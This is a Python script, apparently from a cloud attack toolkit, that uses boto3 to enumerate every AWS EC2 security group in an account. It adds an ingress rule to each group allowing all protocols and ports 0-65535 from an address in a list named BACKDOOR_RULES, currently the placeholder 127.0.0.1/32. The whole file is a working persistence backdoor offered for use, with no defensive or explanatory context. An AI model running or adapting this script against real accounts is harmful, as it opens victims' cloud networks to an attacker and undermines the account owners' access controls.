#!/usr/bin/env python
from __future__ import print_function
import boto3
from botocore.exceptions import ClientError
import json
import random


# A list of rules to add at random to security groups.
BACKDOOR_RULES = [
    { 'FromPort': 0, 'ToPort': 65535, 'CidrIp': '127.0.0.1/32', 'IpProtocol': '-1'}
]


def main(args):
    backdoor_security_groups(get_security_groups())
    

def get_security_groups():
    client = boto3.client('ec2')
    response = None
    security_group_names = []
    marker = None
     
    response = client.describe_security_groups()
    for security_group in response['SecurityGroups']:
        security_group_names.append(security_group['GroupName'])
     
    return security_group_names


def backdoor_security_groups(security_group_names):
    for security_group_name in security_group_names:
        backdoor_security_group(security_group_name)


def backdoor_security_group(security_group_name):
    print(security_group_name)
    client = boto3.client('ec2')
    backdoor_rule = random.choice(BACKDOOR_RULES)
    try:
        response = client.authorize_security_group_ingress(
            GroupName=security_group_name,
            CidrIp=backdoor_rule['CidrIp'],
            FromPort=backdoor_rule['FromPort'],
            ToPort=backdoor_rule['ToPort'],
            IpProtocol=backdoor_rule['IpProtocol']
        )
        # If it is an old account, you may need to use:
        # authorize_db_security_group_ingress
        # authorize_cache_security_group_ingress
        # authorize_cluster_security_group_ingress
    except ClientError as e:
        print("  " + e.response['Error']['Message'])


if __name__ == '__main__':
    args = None
    main(args)